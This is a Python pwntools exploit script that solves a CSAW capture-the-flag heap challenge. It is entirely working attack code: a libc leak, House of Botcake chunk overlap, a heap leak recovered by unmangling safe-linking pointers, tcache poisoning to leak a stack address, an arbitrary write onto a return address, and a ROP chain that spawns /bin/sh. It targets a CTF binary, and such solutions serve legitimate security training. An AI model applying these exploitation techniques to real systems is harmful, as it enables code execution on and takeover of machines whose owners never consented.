from pwn import *

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chal_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

serv = "chals.ctf.csaw.io"
port = 21008

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r

r = conn()


def malloc(index: int, type: int, data: bytes):
    sla(b'>> ', b'1')
    sla(b'Slot: ', sen(index))
    sla(b'Dessert): ', sen(type))
    sna(b'Ingredients: ', data)

def free(index: int):
    sla(b'>> ', b'2')
    sla(b'Slot: ', sen(index))

def write(index: int, data: bytes):
    sla(b'>> ', b'3')
    sla(b'Slot: ', sen(index))
    sna(b'Ingredients: ', data)

def read(index: int):
    sla(b'>> ', b'4')
    sla(b'Slot: ', sen(index))
    return rcl().strip()

def heap_leak_from_mangled_ptr(mangled: int, ls3b: int):
    i = 2
    mangler3b = (mangled ^ ls3b) & 0xfff
    unmangled = ls3b + (mangler3b << 12)
    mangled >>= 12
    while mangled > 0:
        mangler3b = (mangled ^ mangler3b) & 0xfff
        unmangled += mangler3b << (i * 12)
        i += 1
        mangled >>= 12
    return unmangled

def main():

    # libc leak
    for i in range(11):
        malloc(i, 4, b'bruh')
    for i in range(4, 11):
        free(i)
    free(1)
    free(0)
    malloc(11, 1, b'A' * 0x100)
    libc.address = u64(read(11)[0x100:].ljust(8, b'\x00')) - 0x203b20
    log.info(f"{hex(libc.address)=}")


    # House of Botcake for heap leak and tcache poison to read __libc_argv for a libc
    # reference to the stack for a stack leak
    free(3)
    free(2)
    malloc(10, 4, b'bruh')
    free(3) # Achieved overlapping chunks in tcache and unsorted bin
    malloc(12, 1, b'A' * 0x100)

    # heap leak
    heap_base = heap_leak_from_mangled_ptr(u64(read(12)[0x100:].ljust(8, b'\x00')), 0xba0) - 0xba0
    log.info(f"{hex(heap_base)=}")

    # tcache poison to allocate into libc to read __libc_argv
    write(12, b''.join([
        b'A' * 0xf8,
        p64(0x101),
        p64(mangle(libc.sym.__libc_argv - 0x10, heap_base))
    ]))
    malloc(9, 4, b'bruh')
    malloc(8, 4, b'A' * 0x10)

    # stack leak to get retaddr to write to
    stack_leak = u64(read(8)[0x10:].ljust(8, b'\x00'))
    approx_retaddr = stack_leak - 0x148 # THE OFFSET MAY DIFFER A LIL SLIGHTLY
    log.info(f"{hex(stack_leak)=}")


    # Now we just need to arb-alloc again to write to the ret_addr of edit_dish

    # Reset tcache poisoning
    free(9)
    write(12, b'A' * 0xf8 + p64(0x101) + p64(0xdeadbeef) + b'\x00') # Bypass tcache key check
    free(9)

    # Setup arb-alloc into ret_addr of edit_dish
    write(12, b'A' * 0xf8 + p64(0x101) + p64(mangle(approx_retaddr, heap_base)))
    malloc(9, 4, b'bruh')

    # ROP with a ret_gadget sled
    rop = ROP(libc)
    for i in range((0xf8 - 0x18) // 8): 
        rop.raw(libc.address + 0x5877c) # ret_gadget
    rop.system(next(libc.search(b"/bin/sh\x00")))
    # log.info(rop.dump())

    # Send payload
    malloc(7, 4, rop.chain())

    r.interactive()

if __name__ == "__main__":
    main()